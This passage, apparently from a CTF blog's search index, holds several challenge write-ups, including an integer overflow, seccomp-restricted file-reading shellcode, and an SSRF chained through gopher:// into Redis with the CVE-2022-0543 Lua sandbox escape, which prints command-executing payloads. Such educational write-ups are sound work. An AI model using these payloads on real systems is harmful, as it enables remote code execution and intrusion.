.@@@@@#@@@@@@@@#\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026#@@@@@@@@@@@@@\u0026 \u0026@@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@\u0026@@@@@ @@@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@@@@ .@@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@@@ (@@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@@@. @@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@@@ ,@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@@ @@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@/ Current pumpcoins: [1337] Items: 1. Shovel (1337 p.c.) 2. Laser (9999 p.c.) \u0026gt;\u0026gt;  We see that we have 1337 pumpcoins. To find the flag, we need to earn at least 9999 pumpcoins.\nSpotting the vulnerability The vulnerability is in these lines of code:\n// ... menu(); __isoc99_scanf(\"%d\", \u0026amp;option); printf(\"\\nHow many do you want?\\n\\n\u0026gt;\u0026gt; \"); __isoc99_scanf(\"%d\", \u0026amp;amount); if(0\u0026lt;amount) break; printf(\"%s\\n[-] You cannot buy less than 1!\\n\", \u0026amp;DAT_0010134a); } pumpcoins =pumpcoins -amount *(short) *(undefined4 *) ((long) \u0026amp;values +(long) (int) option *4); // ...  Notice that all variables are type short (pumpcoins, option and amount), that is 2-byte variables. This is the balance update formula: pumpcoins = pumpcoins - amount * option * 4.\nWe are not able to enter negative values for amount, but we are allowed for option. Therefore, we can find such values that will result in more than 9999 pumpcoins. This is called Integer Overflow vulnerability, since large negative values wrap around and convert into positive values.\nFlag This way we can get the flag:\n$ nc 134.122.106.203 32141 ##\u0026 (#\u0026\u0026 ##\u0026\u0026 ,*. #%%\u0026 .*, .\u0026@@@@#@@@\u0026@@@@@@@@@@@@\u0026@@\u0026@#@@@@@@( /@@@@\u0026@\u0026@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@\u0026@@@@, @@@@@@@@@@@@@\u0026@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@\u0026@@@@@@\u0026@@@@@@ #\u0026@@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026#@@@@@@@@@@@@@@, .@@@@@#@@@@@@@@#\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026#@@@@@@@@@@@@@\u0026 \u0026@@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@\u0026@@@@@ @@@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@@@@ .@@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@@@ (@@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@@@. @@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@@@ ,@@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@@ @@@@@@@@@@@@@\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026@@@@@@@@@@@@/ Current pumpcoins: [1337] Items: 1. Shovel (1337 p.c.) 2. Laser (9999 p.c.) \u0026gt;\u0026gt; -1 How many do you want? \u0026gt;\u0026gt; 2 Congratulations, here is the code to get your laser: HTB{1nt3g3R_0v3rfl0w_101_0r_0v3R_9000!}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/pumpkin-stand/","section":"ctf","summary":"64-bit binary. Integer Overflow","time":3,"title":"Pumpkin Stand"},{"contents":"We are given a 64-bit binary called pumpking:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)  Environment setup It might happen that we don\u0026rsquo;t have a version of Glibc that is accepted by the program:\n$ ./pumpking zsh: no such file or directory: ./pumpking $ ldd pumpking ./pumpking: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./pumpking) linux-vdso.so.1 (0x00007ffc78fd6000) libseccomp.so.2 =\u0026gt; /lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007f16439e4000) libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f16437f2000) ./glibc/ld-linux-x86-64.so.2 =\u0026gt; /lib64/ld-linux-x86-64.so.2 (0x00007f1643a25000)  Luckily, in Spooky Time we were provided with a library and a loader, version 2.35:\n$ ../pwn_spooky_time/glibc/ld-linux-x86-64.so.2 ../pwn_spooky_time/glibc/libc.so.6 GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. Copyright (C) 2022 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Compiled by GNU CC version 11.2.0. libc ABIs: UNIQUE IFUNC ABSOLUTE For bug reporting instructions, please see: \u0026lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs\u0026gt;.  So, we can copy that directory in the current environment and use pwninit to patch the binary and use this new Glibc version:\n$ cp -r ../pwn_spooky_time/glibc . $ pwninit --libc glibc/libc.so.6 --ld glibc/ld-linux-x86-64.so.2 --bin pumpking --no-template bin: pumpking libc: glibc/libc.so.6 ld: glibc/ld-linux-x86-64.so.2 unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.35-0ubuntu3.1_amd64.deb warning: failed unstripping libc: libc deb error: failed to find file in data.tar copying pumpkingto pumpking_patched running patchelf on pumpking_patched  Now we have another binary (pumpking_patched), and we are able to run it properly:\n$ ./pumpking_patched First of all, in order to proceed, we need you to whisper the secret passphrase provided only to naughty kids: asdf You seem too kind for the Pumpking to help you.. I'm sorry! zsh: invalid system call (core dumped) ./pumpking_patched  Reverse engineering If we open the binary in Ghidra, we will see this decompiled C source code for the main function:\nvoidmain() { intret; size_tsVar1; longin_FS_OFFSET; ulong local_28; undefined8 input_data; undefined4 local_17; undefined2 local_13; undefined local_11; undefined8 canary;  canary =*(undefined8 *) (in_FS_OFFSET +0x28); setup(); input_data =0; local_17 =0; local_13 =0; local_11 =0; write(1, \"\\nFirst of all, in order to proceed, we need you to whisper the secret passphrase provided only to naughty kids: \", 0x70); read(0, \u0026amp;input_data, 14); local_28 =0; while(true) { sVar1 =strlen((char*) \u0026amp;input_data); if(sVar1 \u0026lt;=local_28) break; if(*(char*) ((long)\u0026amp;input_data +local_28) =='\\n') { *(undefined *) ((long) \u0026amp;input_data +local_28) =0; } local_28 =local_28 +1; } ret =strncmp((char*) \u0026amp;input_data, \"pumpk1ngRulez\", 0xd); if(ret ==0) { king(); } else{ write(1, \"\\nYou seem too kind for the Pumpking to help you.. I\\'m sorry!\\n\\n\", 0x3e); } /* WARNING: Subroutine does not return */ exit(0x16); }  First, we are asked for a passphrase. We know the password because it is hard-coded in the binary (pumpk1ngRulez):\n$ ./pumpking_patched First of all, in order to proceed, we need you to whisper the secret passphrase provided only to naughty kids: pumpk1ngRulez [Pumpkgin]: Welcome naughty kid! This time of the year, I will make your wish come true! Wish for everything, even for tha flag! \u0026gt;\u0026gt; asdf zsh: illegal hardware instruction (core dumped) ./pumpking_patched  At this point, a function called king is executed:\nvoidking() { longin_FS_OFFSET; undefined8 shellcode; undefined8 local_a0; undefined8 local_98; undefined8 local_90; undefined8 local_88; undefined8 local_80; undefined8 local_78; undefined8 local_70; undefined8 local_68; undefined8 local_60; undefined8 local_58; undefined8 local_50; undefined8 local_48; undefined8 local_40; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; undefined4 local_18; undefined2 local_14; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); write(1, \"\\n[Pumpkgin]: Welcome naughty kid! This time of the year, I will make your wish come true! Wish for everything, even for tha flag!\\n\\n\u0026gt;\u0026gt; \", 0x88); shellcode =0; local_a0 =0; local_98 =0; local_90 =0; local_88 =0; local_80 =0; local_78 =0; local_70 =0; local_68 =0; local_60 =0; local_58 =0; local_50 =0; local_48 =0; local_40 =0; local_38 =0; local_30 =0; local_28 =0; local_20 =0; local_18 =0; local_14 =0; read(0, \u0026amp;shellcode, 0x95); (*(code *) \u0026amp;shellcode)(); if(canary !=*(long*)(in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  Basically, we are allowed to send instructions that will be executed by the program. However, there are some seccomp rules configured in setup. We can use seccomp-tools to find which syscall instructions are allowed:\n$ seccomp-tools dump ./pumpking_patched line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0xc000003e if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u0026lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x06 0xffffffff if (A != 0xffffffff) goto 0011 0005: 0x15 0x04 0x00 0x00000000 if (A == read) goto 0010 0006: 0x15 0x03 0x00 0x00000001 if (A == write) goto 0010 0007: 0x15 0x02 0x00 0x0000000f if (A == rt_sigreturn) goto 0010 0008: 0x15 0x01 0x00 0x0000003c if (A == exit) goto 0010 0009: 0x15 0x00 0x01 0x00000101 if (A != openat) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0011: 0x06 0x00 0x00 0x00000000 return KILL  So, we are allowed to use sys_read, sys_write, sys_rt_sigreturn, sys_exit and sys_openat.\nExploit development This challenge is a mix between Blacksmith and Fleet Management.\nHence, I will reuse the assembly code for sys_openat from Fleet Management and the assembly code for sys_read and sys_write from Blacksmith. This is the result:\nxor rdx, rdx push rdx mov rsi, 'flag.txt' # as hexadecimal number push rsi mov rsi, rsp xor rdi, rdi sub rdi, 100 mov rax, 0x101 syscall mov dl, 0x64 mov rsi, rsp xor edi, eax xor al, al syscall mov al, 1 mov rdi, rax syscall mov al, 0x3c syscall  For more information you can check out the other challenges.\nFlag If we run the exploit script that sends the shellcode, we will see the flag:\n$ python3 solve.py 159.65.49.148:32050 [*] './pumpking_patched' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments RUNPATH: b'./glibc' [+] Opening connection to 159.65.49.148 on port 32050: Done [*] Shellcode length: 0x3e [+] HTB{n4ughty_b01z_d0_n0t_f0ll0w_s3cc0mp_rul3z} [*] Closed connection to 159.65.49.148 port 32050  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/pumpking/","section":"ctf","summary":"64-bit binary. seccomp rules. Custom shellcode","time":5,"title":"Pumpking"},{"contents":"We are given a binary file called Pusheen. It we execute it, we will see a picture of a cat:\n$ ./Pusheen ▐▀▄ ▄▀▌ ▄▄▄▄▄▄▄ ▌▒▒▀▄▄▄▄▀▒▒▐▄▀▀▒██▒██▒▀▀▄ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄ ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▄▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄ ▀█▒▒█▌▒▒█▒▒▐█▒▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌ ▀▌▒▒▒▒▒▀▒▀▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐ ▄▄ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌▄█▒█ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▒█▀ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▀ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌ ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌ ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐ ▐▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▌ ▀▄▄▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀  If we check the printable strings inside the file, there are a lot that start with e_ (actually, they run from e_0_0 to e_66_100). We can count them like this:\n$ strings Pusheen | wc -l 6767  These strings might be function names, because the binary is not stripped:\n$ file Pusheen Pusheen: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, not stripped  Ghidra won\u0026rsquo;t help this time to do binary analysis. However, if we open the binary in IDA, we will see a warning message:\nActually, the name of the challenge talks about graphs, and IDA usually shows the assembly code in a graph view. Furthermore, the description of the challenge points the usage of IDA.\nWe can fix the maximum number of nodes:\nAnd then tell IDA to show the main function in a graph. We get this:\nCool, isn\u0026rsquo;t it? That\u0026rsquo;s the graphical representation of the code: function calls, conditional statements, loops\u0026hellip;\nAnyway, this is the flag: HTB{fUn_w17h_CFGz}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/misc/pusheen-loves-graphs/","section":"ctf","summary":"Looking at the graph view of a binary","time":1,"title":"Pusheen Loves Graphs"},{"contents":"We are given an image containing a QR code:\nIf we scan it, we will get this string:\nc3ludCB2ZiA6IGEwX29icWxfczBldHJnX2RlX3BicXI=  It seems to be encoded in Base64, let\u0026rsquo;s try to decode it:\n$ echo c3ludCB2ZiA6IGEwX29icWxfczBldHJnX2RlX3BicXI= | base64 -d synt vf : a0_obql_s0etrg_de_pbqr  But we don\u0026rsquo;t see anything readable. There seems to be a substitution algorithm such as ROT13. Let\u0026rsquo;s go to CyberChef and check it out:\nWe see: \u0026ldquo;flag is : n0_body_f0rget_qr_code\u0026rdquo;, so the flag is: CTFlearn{n0_body_f0rget_qr_code}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/miscellaneous/qr-code/","section":"ctf","summary":"QR code scanning. Base64. ROT13","time":1,"title":"QR Code"},{"contents":"We have a binary called rebuilding:\n$ file rebuilding rebuilding: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c7a145f3a4b213cf895a735e2b26adffc044c190, not stripped  If we run it, it requires to use a command line argument:\n$ ./rebuilding Preparing secret keys Missing required argument  Let\u0026rsquo;s open it in Ghidra and decompile it. This is the main function:\nundefined8 main(intargc, longargv) { int__c; size_tlength; undefined8 ret; intchecks; inti; intj;  if(argc !=2) { puts(\"Missing required argument\"); /* WARNING: Subroutine does not return */ exit(-1); } checks =0; length =strlen(*(char**) (argv +8)); if(length ==32) { for(i =0; i \u0026lt;32; i =i +1) { printf(\"\\rCalculating\"); for(j =0; j \u0026lt;6; j =j +1) { if(j ==i %6) { __c =0x2e; } else{ __c =0x20; } putchar(__c); } fflush(stdout); checks =checks +(uint) ((byte) (encrypted[i] ^key[i %6]) == *(byte *) ((long) i +*(long*) (argv +8))); usleep(200000); } puts(\"\"); if(checks ==32) { puts(\"The password is correct\"); ret =0; } else{ puts(\"The password is incorrect\"); ret =0xffffffff; } } else{ puts(\"Password length is incorrect\"); ret =0xffffffff; } returnret; }  First thing to notice is that the argument must be 32 bytes long, let\u0026rsquo;s verify it:\n$ ./rebuilding $(python3 -c 'print(\"A\" * 32)') Preparing secret keys Calculating . The password is incorrect  Alright, so we have the correct length. Then the program computes a XOR operation with encrypted and key global variables and checks that the result equals the passed argument. Let\u0026rsquo;s check what\u0026rsquo;s in encrypted and key:\n$ readelf -s rebuilding | grep -E 'encrypted|key' 48: 0000000000201020 34 OBJECT GLOBAL DEFAULT 23 encrypted 51: 0000000000201042 7 OBJECT GLOBAL DEFAULT 23 key  To read their contents with xxd, we need to substract 0x20000 to both addresses. So we have the following contents:\n$ xxd rebuilding | grep -A 2 1020: 00001020: 2938 2b1e 0642 055d 0702 3110 5108 5a16 )8+..B.]..1.Q.Z. 00001030: 3142 0f33 0a55 0000 151e 1c06 1a43 1359 1B.3.U.......C.Y 00001040: 1400 6875 6d61 6e73 0047 4343 3a20 2855 ..humans.GCC: (U  Here we have that key is \u0026quot;humans\u0026quot; (a 6-byte string), and encrypted are just raw bytes. If we do the XOR operation between these two, we should get the expected parameter (the flag). For this purpose, we can use CyberChef:\nBut it is not correct. Let\u0026rsquo;s use GDB to see what happens:\n$ gdb -q rebuilding Reading symbols from rebuilding... (No debugging symbols found in rebuilding) gef➤ disassemble main Dump of assembler code for function main: ... 0x0000000000000991 \u0026lt;+266\u0026gt;: lea rax,[rip+0x2006aa] # 0x201042 \u0026lt;key\u0026gt; 0x0000000000000998 \u0026lt;+273\u0026gt;: movzx eax,BYTE PTR [rdx+rax*1] 0x000000000000099c \u0026lt;+277\u0026gt;: xor esi,eax 0x000000000000099e \u0026lt;+279\u0026gt;: mov ecx,esi 0x00000000000009a0 \u0026lt;+281\u0026gt;: mov rax,QWORD PTR [rbp-0x20] 0x00000000000009a4 \u0026lt;+285\u0026gt;: add rax,0x8 0x00000000000009a8 \u0026lt;+289\u0026gt;: mov rdx,QWORD PTR [rax] 0x00000000000009ab \u0026lt;+292\u0026gt;: mov eax,DWORD PTR [rbp-0x8] 0x00000000000009ae \u0026lt;+295\u0026gt;: cdqe 0x00000000000009b0 \u0026lt;+297\u0026gt;: add rax,rdx 0x00000000000009b3 \u0026lt;+300\u0026gt;: movzx eax,BYTE PTR [rax] 0x00000000000009b6 \u0026lt;+303\u0026gt;: cmp cl,al 0x00000000000009b8 \u0026lt;+305\u0026gt;: sete al 0x00000000000009bb \u0026lt;+308\u0026gt;: movzx eax,al ... End of assembler dump.  We can set a breakpoint at the cmp instruction and run the program:\ngef➤ break *main+303 Breakpoint 1 at 0x9b6 gef➤ run $(python3 -c 'print(\"A\" * 32)') Starting program: /home/rocky/Desktop/HTB/Challenges/Reversing/Rebuilding/rebuilding $(python3 -c 'print(\"A\" * 32)') Preparing secret keys Calculating. Breakpoint 1, 0x00005555554009b6 in main ()  gef➤ x/i $rip =\u0026gt; 0x5555554009b6 \u0026lt;main+303\u0026gt;: cmp cl,al gef➤ p/c $rcx $1 = 0x48 gef➤ p/c $rax $2 = 0x41  So the expected value for $rax is 0x48 (H). Let\u0026rsquo;s change it and continue:\ngef➤ set $rax = $rcx gef➤ continue Continuing. Calculating . Breakpoint 1, 0x00005555554009b6 in main ()  gef➤ p/c $rcx $3 = 0x54  Now the expected character is 0x54 (T). We can continue this manual process until get the flag HTB{...}. But at this point, we can create a Python script using pwntools to automate this process of rebuilding the flag:\n$ python3 solve.py [+] Starting local process '/usr/bin/gdb': pid 24165 [+] Flag: HTB{h1d1ng_c0d3s_1n_c0nstruct0r5} [*] Stopped process '/usr/bin/gdb' (pid 24165)  The full script can be found in here: solve.py.\nHowever, let\u0026rsquo;s see what\u0026rsquo;s in key:\ngef➤ disassemble main Dump of assembler code for function main: ... 0x000055555540098e \u0026lt;+263\u0026gt;: movsxd rdx,edx 0x0000555555400991 \u0026lt;+266\u0026gt;: lea rax,[rip+0x2006aa] # 0x555555601042 \u0026lt;key\u0026gt; 0x0000555555400998 \u0026lt;+273\u0026gt;: movzx eax,BYTE PTR [rdx+rax*1] 0x000055555540099c \u0026lt;+277\u0026gt;: xor esi,eax ... gef➤ x/s 0x555555601042 0x555555601042 \u0026lt;key\u0026gt;: \"aliens\"  Alright, the key variable has changed. Using \u0026quot;aliens\u0026quot; we are able to decrypt the XOR cipher using CyberChef to get the flag:\nAnd the issue was that the key variable was modified in a constructor (_INIT_1 in Ghidra):\nvoid_INIT_1() { puts(\"Preparing secret keys\"); key[0] ='a'; key[1] ='l'; key[2] ='i'; key[3] ='e'; key[4] ='n'; key[5] ='s'; return; }  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/reversing/rebuilding/","section":"ctf","summary":"XOR. Hidden key. Debugging with GDB","time":4,"title":"Rebuilding"},{"contents":"We are given a website like this:\nWe can register a new account and then login to see this functionality:\nThis time we don\u0026rsquo;t have the source code for the web application, so we must find a clear vulnerability or get the source code somehow.\nWe can start thinking of Server-Side Request Forgery (SSRF). As in other challenges, we know that the web server listens on port 1337, so let\u0026rsquo;s try and get http://127.0.0.1:1337:\nAnd we get the HTML code for the index.html page. Then it is vulnerable to SSRF. We can try using other protocol schemas as file://:\nAlright, we can turn the SSRF into a path traversal vulnerability and read files from the server.\nWe can continue by enumerating processes to see what is going on. We see two important services running:\nSo we see that it is a Node.js app that uses Redis. As in other challenges, the source code main file might be at /app/index.js. Let\u0026rsquo;s verify it:\nPerfect. We can get the source code. This is /app/index.js:\nconst express = require('express') const app = express() const session = require('express-session') const RedisStore = require('connect-redis')(session) const path = require('path') const cookieParser = require('cookie-parser') const nunjucks = require('nunjucks') const routes = require('./routes') const Database = require('./database') const { createClient } = require('redis') const redisClient = createClient({ legacyMode: true }) const db = new Database('redisland.db') app.use(express.json()) app.use(cookieParser()) redisClient.connect().catch(console.error) app.use( session({ store: new RedisStore({ client: redisClient }), saveUninitialized: false, secret: 'r4yh4nb34t5B1gM4c', resave: false }) ) nunjucks.configure('views', { autoescape: true, express: app }) app.set('views', './views') app.use('/static', express.static(path.resolve('static'))) app.use(routes(db)) app.all('*', (req, res) =\u0026gt; { return res.status(404).send({ message: '404 page not found' }) }) ;(async () =\u0026gt; { await db.connect() await db.migrate() app.listen(1337, '0.0.0.0', () =\u0026gt; console.log('Listening on port 1337')) })()  We can still get more source files, but none of them has more information to solve the challenge. All third-party libraries are updated, so there is no image processing vulnerabilities.\nOne thing to notice is that we don\u0026rsquo;t know where is the flag. So we must guess that we need to obtain Remote Code Execution on the server to look for the flag.\nMoreover, since the challenge is called \u0026ldquo;Red Island\u0026rdquo; and we know that Redis is being used as session storage, the solution must be related to Redis.\nDoing some research, we can get to CVE-2022-0543, which is a way to execute commands escaping from Lua sandbox. This blog post shows how to exploit it. Basically, it uses an EVAL query on Redis to execute Lua code, and escapes from the sandbox using an external shared library:\neval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0  The shared libary is available in the server:\nSo we are on the right path. Now we need to figure out how to interact with Redis using SSRF.\nDoing some research, we can see that curl is able to talk to Redis using HTTP, but we need specific parameters and we can\u0026rsquo;t use them on this website.\nThere is another protocol that can communicate with Redis, and that is the gopher:// protocol. In fact, there are ways to get RCE using this protocol (and without the previous CVE), but they don\u0026rsquo;t work this time. More information at infosecwriteups.com.\nBasically, we will use the Lua code from EVAL to execute commands on the server. We need to be careful on URL encoding and some protocol fields to set the correct content length.\nFor instance, we can use the following URL to execute ls /:\ngopher://127.0.0.1:6379/_*3%0d%0a%244%0d%0aeval%0d%0a%24178%0d%0a%0a%0alocal%20io_l%20%3d%20package.loadlib('%2fusr%2flib%2fx86_64-linux-gnu%2fliblua5.1.so.0'%2c'luaopen_io')%3blocal%20io%3dio_l()%3blocal%20f%3dio.popen('ls%20%2f'%2c'r')%3blocal%20res%3df%3aread('*a')%3bf%3aclose()%3breturn%20res%0a%0a%0d%0a%241%0d%0a0%0d%0a*1%0d%0a%244%0d%0aquit%0d%0a  Notice that there is an integer 178 that represents the length of the EVAL command. We have this output:\nWe see a file called readflag. Let\u0026rsquo;s see what type of file we have using file /readflag (we need to update the length to 188):\ngopher://127.0.0.1:6379/_*3%0d%0a%244%0d%0aeval%0d%0a%24188%0d%0a%0a%0alocal%20io_l%20%3d%20package.loadlib('%2fusr%2flib%2fx86_64-linux-gnu%2fliblua5.1.so.0'%2c'luaopen_io')%3blocal%20io%3dio_l()%3blocal%20f%3dio.popen('file%20%2freadflag'%2c'r')%3blocal%20res%3df%3aread('*a')%3bf%3aclose()%3breturn%20res%0a%0a%0d%0a%241%0d%0a0%0d%0a*1%0d%0a%244%0d%0aquit%0d%0a  It is an ELF binary, so maybe if we execute it we get the flag. Then, let\u0026rsquo;s run /readflag (we need to update the length to 183):\ngopher://127.0.0.1:6379/_*3%0d%0a%244%0d%0aeval%0d%0a%24183%0d%0a%0a%0alocal%20io_l%20%3d%20package.loadlib('%2fusr%2flib%2fx86_64-linux-gnu%2fliblua5.1.so.0'%2c'luaopen_io')%3blocal%20io%3dio_l()%3blocal%20f%3dio.popen('%2freadflag'%2c'r')%3blocal%20res%3df%3aread('*a')%3bf%3aclose()%3breturn%20res%0a%0a%0d%0a%241%0d%0a0%0d%0a*1%0d%0a%244%0d%0aquit%0d%0a  And there it is: HTB{r3d_h4nd5_t0_th3_r3disland!}.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/red-island/","section":"ctf","summary":"SSRF. Path Traversal. Gopher protocol. Redis RCE","time":4,"title":"Red Island"},{"contents":"We are given a PDF file called Financial_Report_for_ABC_Labs.pdf. It shows some text:\nBut there are some words that where hidden using a kind of black \u0026ldquo;background color\u0026rdquo;. However, we can still select the whole text using the mouse, and there is the flag:\nFinancial Report for ABC Labs, Kigali, Rwanda for the year 2021. Breakdown - Just painted over in MS word. Cost Benefit Analysis Credit Debit This is not the flag, keep looking Expenses from the picoCTF{C4n_Y0u_S33_m3_fully} Redacted document.  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/forensics/redaction-gone-wrong/","section":"ctf","summary":"picoCTF 2022. 100 points. Hidden text in PDF","time":1,"title":"Redaction gone wrong"},{"contents":"We are given a binary file called reflection:\n$ file reflection reflection: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d57b0acdb0fda3fe599c48fa63ca61e7694b8b60, for GNU/Linux 3.2.0, not stripped  If we open Ghidra and take a look at the decompiled C source code, we will see the main function:\nundefined8 main() { longj; char*__format; byte flag_input[100]; intk; int_j; int_length; inti; intlength; printf(\"\u0026gt;\u0026gt;\u0026gt; \"); fgets((char*) flag_input, 100, stdin); _length =0; _j =0; k =0; while(true) { length =_length; i =_j; j =(long)_j; _j =_j +1; if((flag[j] ^flag_input[i]) !=*(byte *) ((long) k +0x100000)) break; _length =_length +1; if(64\u0026lt;length) break; do{ k =k +1; } while(*(char*) ((long) k +0x100000) =='\\0'); } if(_length ==65) { __format =\"yes\"; } else{ __format =\"no\"; } printf(__format); return0; }  The program expects to enter the flag and it uses XOR to encrypt the flag and compares it to some data stored in the binary. Specifically, the comparison is made with the ELF header (first 65 bytes, skipping null bytes).\nThe global symbol flag is at address 0x4060:\n$ readelf -s reflection | grep flag 68: 0000000000004060 65 OBJECT GLOBAL DEFAULT 25 flag  We can take a look at these bytes with xxd (but notice that we need to substract 0x1000, because the binary is not loaded):\n$ 